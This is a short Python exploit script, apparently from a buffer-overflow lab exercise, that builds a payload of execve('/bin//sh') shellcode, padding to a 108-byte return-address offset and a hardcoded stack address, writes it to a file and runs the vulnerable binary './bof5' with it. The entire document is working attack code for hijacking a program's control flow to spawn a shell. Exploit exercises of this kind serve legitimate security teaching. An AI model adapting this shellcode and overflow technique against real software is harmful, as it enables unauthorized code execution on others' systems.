import struct
import os

buff_eip = 108
shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
buff = 0xbffff150 #0xbffff180
nop = '\x90'

atk_vector = shellcode
atk_vector += 'a' * (buff_eip-len(atk_vector)) 
atk_vector += struct.pack("I", buff)

f = open("badfile", 'w+')
f.write(atk_vector)
f.close()

os.system(" ./bof5 $(cat {})".format('badfile'))


